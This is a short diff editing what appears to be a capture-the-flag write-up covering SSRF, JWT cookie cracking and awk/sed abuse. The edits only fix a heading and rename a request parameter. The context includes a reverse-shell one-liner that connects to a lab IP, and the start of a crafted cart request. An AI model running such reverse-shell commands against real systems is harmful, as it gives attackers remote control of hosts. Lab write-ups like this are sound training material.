@@ -4,7 +4,7 @@
 
 ### Tools: ffuf, jwt_tool
 
-### Vulnerabilities: SSRF:Internal ports, JWT cookie cracking, Awk abuse, Sed abuse.
+### Vulnerabilities: SSRF:Internal ports, JWT cookie cracking, Awk abuse, Sed abuse
 
 Nmap shows an ssh port open and of course a webpage.
 
@@ -1029,7 +1029,7 @@ sh -i >& /dev/tcp/10.10.16.6/1234 0>&1
 ```
 
 
-4. Capture the request to remove the item from the cart and change the ```item_id=``` to the one below
+4. Capture the request to remove the item from the cart and change the ```item=``` to the one below
 
 ```
 POST /cart_actions.php HTTP/1.1
